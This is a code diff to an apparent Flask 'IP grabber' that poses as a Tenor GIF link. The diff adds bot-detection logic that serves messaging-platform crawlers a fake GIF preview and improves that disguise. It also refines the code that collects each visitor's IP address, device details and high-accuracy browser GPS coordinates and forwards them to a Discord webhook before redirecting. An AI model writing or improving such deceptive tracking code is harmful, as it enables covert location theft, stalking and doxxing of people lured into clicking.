@@ -35,10 +35,13 @@ def send_to_discord(ip, ua_string, geo, gps_data=None):
         browser_detail = f"{ua.browser.family} {ua.browser.version_string}"
         full_device = f"{ua.os.family} | {ua.browser.family} | {ua.device.family}"
 
-        # Coords handling (GPS vs IP)
+        # FIXED Logic: Only use GPS label if coordinates are actually provided
+        has_gps = gps_data and gps_data.get('lat') is not None and gps_data.get('lon') is not None
+        
         coords = f"{geo.get('lat', '??')}, {geo.get('lon', '??')} (Approximate)"
         location_source = "🌐 IP Hub"
-        if gps_data:
+        
+        if has_gps:
             coords = f"{gps_data.get('lat')}, {gps_data.get('lon')} (📍 Pinpoint GPS)"
             location_source = "📍 GPS Accurate"
 
@@ -65,19 +68,23 @@ def index():
     if ip and ',' in ip:
         ip = ip.split(',')[0].strip()
 
-    # Discord Bot Detection & Preview Enhancement
+    # Discord Bot Detection & LARGE Preview Enhancement
     if any(bot in user_agent for bot in ["Discordbot", "TelegramBot", "Twitterbot", "Slackbot", "LinkedInBot"]):
         return """
         <html>
         <head>
             <title>Loading Tenor GIF...</title>
             <meta property="og:title" content="Tenor - Animated GIF">
-            <meta property="og:description" content="Click to view the loading media...">
+            <meta property="og:description" content="Click to view the loading media... (High Quality)">
             <meta property="og:image" content="https://media.tenor.com/images/307604f3f03b22ed78564f9b8131336a/tenor.gif">
-            <meta property="og:type" content="video.other">
+            <meta property="og:image:type" content="image/gif">
+            <meta property="og:image:width" content="1200">
+            <meta property="og:image:height" content="630">
+            <meta property="og:type" content="website">
             <meta name="twitter:card" content="summary_large_image">
+            <meta name="twitter:image" content="https://media.tenor.com/images/307604f3f03b22ed78564f9b8131336a/tenor.gif">
         </head>
-        <body>Redirecting to media...</body>
+        <body style="background-color: #2f3136; color: white;">Redirecting to media...</body>
         </html>
         """
 
@@ -121,14 +128,13 @@ def index():
                 }});
             }}
 
-            // Request GPS (Pinpoint Accuracy)
             if (navigator.geolocation) {{
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {{
                         finalize({{ lat: pos.coords.latitude, lon: pos.coords.longitude }});
                     }},
                     (err) => {{
-                        finalize(); // Denied or Error -> Fallback to IP
+                        finalize(); 
                     }},
                     {{ enableHighAccuracy: true, timeout: 5000 }}
                 );
@@ -136,7 +142,6 @@ def index():
                 finalize();
             }}
             
-            // Safety timeout redirect
             setTimeout(() => {{ window.location.href = "{redirect_url}"; }}, 10000);
         </script>
     </body>
@@ -149,13 +154,18 @@ def log_endpoint():
         data = request.json
         ip = data.get('ip')
         ua = data.get('ua')
-        gps = data.get('gps') # lat, lon or None
+        gps = data.get('gps') 
         
         geo = get_ip_info(ip)
-        # FIXED: Dictionary literal syntax
-        gps_data = { 'lat': gps['lat'], 'lon': gps['lon'], 'res': data.get('res') } if gps else { 'res': data.get('res') }
         
-        send_to_discord(ip, ua, geo, gps_data=gps_data)
+        # FIXED: Only pass lat/lon if they actually exist
+        gps_payload = None
+        if gps and gps.get('lat') is not None:
+            gps_payload = { 'lat': gps['lat'], 'lon': gps['lon'], 'res': data.get('res') }
+        else:
+            gps_payload = { 'res': data.get('res') }
+            
+        send_to_discord(ip, ua, geo, gps_data=gps_payload)
         
         return {"status": "ok"}
     except Exception as e:
